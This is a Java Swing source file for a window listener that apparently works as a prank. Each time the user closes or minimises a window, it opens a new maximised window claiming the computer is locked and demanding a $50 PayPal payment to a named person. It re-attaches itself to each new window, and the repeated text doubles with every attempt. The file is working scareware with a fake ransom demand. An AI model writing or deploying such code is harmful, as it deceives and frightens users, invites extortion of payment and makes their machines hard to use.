package GUI;

import java.awt.Color;
import java.awt.Font;
import java.awt.event.WindowEvent;
import java.awt.event.WindowListener;

import javax.swing.BoxLayout;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;

public class memeMagicHandler2 implements WindowListener {
    private int n=1;
	@Override
	public void windowOpened(WindowEvent e) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void windowClosing(WindowEvent e) {
		n*=2;
		// TODO Auto-generated method stub
		JFrame f = new JFrame();
		JPanel p=new JPanel();
		p.setLayout(new BoxLayout(p, BoxLayout.Y_AXIS));
		p.add(new JLabel("Loading..."));
		int i=1;
		while(i<n) {
		i++;
		JLabel j=new JLabel("Your Computer has been locked.");
		j.setFont(new Font("Courier", Font.BOLD, 50));
		JLabel l =new JLabel("To Unlock, Paypal $50 to Matthew Hertz.");
		l.setFont(new Font("Courier", Font.BOLD, 50));
		p.add(j);
		p.add(l);}
		p.setBackground(Color.BLUE);
		f.add(p);
		f.setExtendedState(JFrame.MAXIMIZED_BOTH);
		f.setVisible(true);
		f.addWindowListener(this);
	}

	@Override
	public void windowClosed(WindowEvent e) {
		// TODO Auto-generated method stub

	}

	@Override
	public void windowIconified(WindowEvent e) {
		n*=2;
		// TODO Auto-generated method stub
		JFrame f = new JFrame();
		JPanel p=new JPanel();
		p.setLayout(new BoxLayout(p, BoxLayout.Y_AXIS));
		p.add(new JLabel("Loading..."));
		int i=1;
		while(i<n) {
		i++;
		JLabel j=new JLabel("Your Computer has been locked.");
		j.setFont(new Font("Courier", Font.BOLD, 50));
		JLabel l =new JLabel("To Unlock, Paypal $50 to Matthew Hertz.");
		l.setFont(new Font("Courier", Font.BOLD, 50));
		p.add(j);
		p.add(l);}
		p.setBackground(Color.BLUE);
		f.add(p);
		f.setExtendedState(JFrame.MAXIMIZED_BOTH);
		f.setVisible(true);
		f.addWindowListener(this);
	}

	@Override
	public void windowDeiconified(WindowEvent e) {
		// TODO Auto-generated method stub

	}

	@Override
	public void windowActivated(WindowEvent e) {
		// TODO Auto-generated method stub

	}

	@Override
	public void windowDeactivated(WindowEvent e) {
		// TODO Auto-generated method stub

	}

}
